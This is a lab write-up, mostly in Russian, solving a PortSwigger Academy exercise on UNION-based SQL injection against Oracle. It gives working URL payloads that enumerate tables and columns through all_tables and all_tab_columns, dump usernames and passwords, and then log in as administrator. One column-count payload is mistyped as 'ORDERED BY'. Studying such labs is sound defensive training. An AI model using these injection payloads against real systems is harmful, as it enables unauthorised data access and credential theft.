# SQL injection attack, listing the database contents on Oracle

## Theory

<h3>Список содержимого базы данных Oracle</h3>

Мы можем получить список таблиц, запросив all_tables:
```
SELECT * FROM all_tables
```

Далее мы можем перечислить столбцы, запросив all_tab_columns:
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_Oracle/assets/1.png)

Выбираем пункт Pets. Определяем [количество стобцов](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_determining_the_number_of_columns_returned_by_the_query) и какой [тип данных](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_finding_a_column_containing_text) они принимают. 

```
/filter?category=Pets'ORDERED+BY+3--

/filter?category=Pets'UNION+SELECT+'a','a'+FROM+dual--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_Oracle/assets/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_Oracle/assets/3.png)

Выведем таблицы которые есть в базе данных.
```
/filter?category=Pets'UNION+SELECT+table_name,'a'+FROM+all_tables--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_Oracle/assets/4.png)

Находим нужную таблицу. Достанем столбцы из этой таблицы.
```
/filter?category=Pets'UNION+SELECT+column_name,'a'+FROM+all_tab_columns+WHERE+table_name='USERS_CPUAFD'--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_Oracle/assets/5.png)

Затем достанем данные пользователей из столбца.
```
/filter?category=Pets'UNION+SELECT+USERNAME_JSDPJL,PASSWORD_MGGFPZ+FROM+USERS_CPUAFD--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_Oracle/assets/6.png)

Заходим в учетную запись администратора.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_Oracle/assets/7.png)
